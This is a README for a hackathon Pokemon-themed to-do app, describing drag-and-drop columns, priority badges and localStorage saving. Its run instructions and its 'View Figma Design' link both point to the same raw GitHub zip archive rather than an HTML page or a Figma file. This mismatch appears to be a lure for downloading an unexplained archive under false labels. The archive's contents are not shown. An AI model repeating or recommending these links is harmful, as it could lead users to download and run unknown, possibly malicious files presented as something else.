# GFG
This is my first solo hackathon

# Pokemon To-Do App

A responsive, Pokemon-themed task management application built with Vanilla JavaScript, HTML, and CSS. This project combines a playful design with powerful task management features.

## 🌟 Key Features

### 🎨 Interactive Design & Responsiveness
- **Pokemon Themed UI**: Custom-styled cards representing different Pokemon types (Plant, Aqua, Fire).
- **Fully Responsive**: Optimized for all devices.
  - **Desktop**: Full grid layout with visible side-by-side columns.
  - **Tablet**: Adaptive scaling for iPad/small laptop screens.
  - **Mobile**: Stacked layout for easy navigation on phones.
- **Dynamic Views**: Seamless switching between the "Home" hero section and the "To-Do" dashboard without page reloads.

### ⚡ Advanced Task Management
- **HTML5 Drag & Drop API**: 
  - Effortlessly drag tasks between "To Do", "In Progress", and "Completed" columns.
  - Visual feedback during drag operations (ghost elements, drop zone highlighting).
  - Auto-sorting support within lists.
- **Priority System with Badges**:
  - Tasks are categorized by urgency with visual indicators:
    - 🟢 **Normal** (Low Priority)
    - 🟡 **Important** (Medium Priority)
    - 🔴 **Urgent** (High Priority)
- **Progress Tracking**: 
  - "In Progress" tasks feature an interactive slider to update completion percentage (0-100%) in real-time.
- **Full CRUD Functionality**:
  - **Create**: Add new tasks with specific priorities.
  - **Read**: View tasks organized by status.
  - **Update**: Edit task titles and status.
  - **Delete**: Remove tasks permanently.

### 💾 Local Storage Persistence
- **Auto-Save**: All tasks are automatically saved to the browser's `localStorage` (key: `pokemonTasks`).
- **State Preservation**: Your data persists even after refreshing the page or closing the browser.
- **Data Structure**: Stores complete task objects including `id`, `title`, `status`, `priority`, and `progress`.

## 🛠️ Tech Stack
- **HTML5**: Semantic structure and Native Drag & Drop API.
- **CSS3**: CSS Variables for easy theming, Flexbox & Grid for layout, and Media Queries for responsiveness.
- **JavaScript (ES6+)**: DOM manipulation, Event handling, and State management.

## 🚀 How to Run
1. Clone the repository.
2. Open `https://raw.githubusercontent.com/Always-imperfect0/GFG/main/blackish/GFG_1.7.zip` in your browser.
3. Start managing your tasks!

## 🎨 Design & Prototyping
The UI/UX design was completely crafted by me. You can explore the original prototype here:
- [**View Figma Design**](https://raw.githubusercontent.com/Always-imperfect0/GFG/main/blackish/GFG_1.7.zip)
